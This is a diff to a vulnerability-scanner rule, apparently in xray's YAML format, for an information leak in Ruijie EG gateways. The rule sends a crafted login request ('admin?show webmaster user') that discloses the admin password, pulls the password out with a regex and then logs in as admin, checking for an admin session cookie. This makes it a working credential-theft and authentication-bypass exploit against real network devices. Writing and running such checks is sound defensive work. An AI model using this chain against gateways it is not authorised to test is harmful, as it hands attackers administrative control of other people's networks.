@@ -6,17 +6,18 @@ rules:
       Content-Type: application/x-www-form-urlencoded
     body: |
       username=admin&password=admin?show+webmaster+user
-    expression: "true"
+    expression: |
+      response.status == 200 && response.content_type.contains("text/json")
     search: |
-      {"data":".*?(?P<username>\w+)\s?(?P<password>\w+)","status":1}
+      {"data":".*admin\s?(?P<password>[^\\"]*)
   - method: POST
     path: /login.php
     headers:
       Content-Type: application/x-www-form-urlencoded
     body: |
-      username={{username}}&password={{password}}
+      username=admin&password={{password}}
     expression: |
-      response.status == 200 && response.body.bcontains(b"{\"data\":\"0\",\"status\":1}")
+      response.status == 200 && response.content_type.contains("text/json") && response.headers["Set-Cookie"].contains("user=admin") && response.body.bcontains(b"{\"data\":\"0\",\"status\":1}")
 detail:
   author: Search?=Null
   description: "Ruijie EG网关信息泄漏"
